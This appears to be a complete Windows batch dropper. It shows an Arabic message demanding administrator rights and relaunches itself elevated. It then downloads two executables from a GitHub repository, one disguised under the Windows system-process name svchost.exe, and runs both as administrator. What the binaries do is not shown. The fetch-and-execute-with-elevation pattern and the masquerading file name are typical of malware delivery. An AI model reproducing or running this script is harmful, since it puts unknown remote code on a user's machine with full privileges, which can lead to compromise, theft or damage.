@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo يجب تشغيل هذا البرنامج بصلاحيات مسؤول. سيتم إعادة التشغيل الآن...
    PowerShell Start-Process "%~f0" -Verb RunAs
    exit /b
)

set "destinationFolder=%USERPROFILE%\Desktop\DownloadedFiles"
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

set "file1=https://github.com/uj9e/zzz/raw/refs/heads/main/plutonium.exe"
set "file2=https://github.com/uj9e/zzz/raw/refs/heads/main/svchost.exe"

PowerShell -Command "Invoke-WebRequest -Uri '%file1%' -OutFile '%destinationFolder%\plutonium.exe'"

PowerShell -Command "Invoke-WebRequest -Uri '%file2%' -OutFile '%destinationFolder%\svchost.exe'"

PowerShell -Command "Start-Process '%destinationFolder%\plutonium.exe' -Verb RunAs"

PowerShell -Command "Start-Process '%destinationFolder%\svchost.exe' -Verb RunAs"

pause